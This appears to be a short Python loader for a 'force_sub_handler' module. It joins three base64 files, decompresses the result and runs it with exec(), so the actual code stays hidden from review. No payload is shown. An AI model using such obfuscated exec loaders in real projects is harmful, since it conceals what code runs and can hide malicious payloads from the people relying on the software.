# compressed loader — needs force_sub_handler_src_1..3.b64
import zlib, base64
from pathlib import Path
_dir = Path(__file__).parent
_b64 = "".join((
    (_dir / f"force_sub_handler_src_{i}.b64").read_text(encoding="utf-8").strip()
    for i in range(1, 3+1)
))
_src = zlib.decompress(base64.b64decode(_b64)).decode("utf-8")
exec(compile(_src, __file__, "exec"), globals())
